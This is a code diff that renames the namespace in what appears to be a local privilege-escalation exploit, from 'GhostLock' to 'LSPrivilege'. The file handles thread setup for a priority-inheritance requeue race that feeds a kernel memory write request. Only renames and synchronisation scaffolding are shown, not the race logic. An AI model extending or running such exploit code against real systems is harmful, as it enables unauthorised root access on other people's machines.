@@ -1,5 +1,5 @@
 /*
- * GhostLock — PI race worker threads and the per-write route entry.
+ * LSPrivilege — PI race worker threads and the per-write route entry.
  *
  * Split out of main.cpp; the statement order and log text are unchanged.
  */
@@ -12,9 +12,9 @@
 #include "route/route_policy.hpp"
 #include "session/exploit_session.hpp"
 
-using namespace ghostlock;
+using namespace lsprivilege;
 
-namespace ghostlock::race {
+namespace lsprivilege::race {
     void *waiter_thread(void *arg) {
         auto *race = static_cast<PiRace *>(arg);
         const memory::WriteRequest *request = race->request;
@@ -166,12 +166,12 @@ namespace ghostlock::race {
         }
         session::g_exploit_session.race.fast_repair.store(fast_repair);
     }
-} // namespace ghostlock::race
+} // namespace lsprivilege::race
 
 /* Wait for the parked waiter/owner pair, trigger the PI requeue and return the
  * route outcome once the waiter reported completion. The count/timeout policy
  * lives in outcome_with_counters() and TODO(pi-timeout-01). */
-ghostlock::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
+lsprivilege::route::RouteStatus lsprivilege::race::PiRace::run() noexcept {
     while (!waiter_waiting.load() || !owner_started.load())
         usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
     pr_info("[route] waiter parked; owner started\n");
@@ -213,7 +213,7 @@ ghostlock::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
     return outcome_with_counters(status, calls, success);
 }
 
-namespace ghostlock::race {
+namespace lsprivilege::race {
     /* Create, synchronize, stop and join one explicitly owned PI race. */
     Status run_main_route_threads(const memory::WriteRequest &request) {
         reset_main_route_state();
@@ -246,4 +246,4 @@ namespace ghostlock::race {
         pr_info("[route] threads joined\n");
         return status.code == route::ROUTE_OK;
     }
-} // namespace ghostlock::race
+} // namespace lsprivilege::race
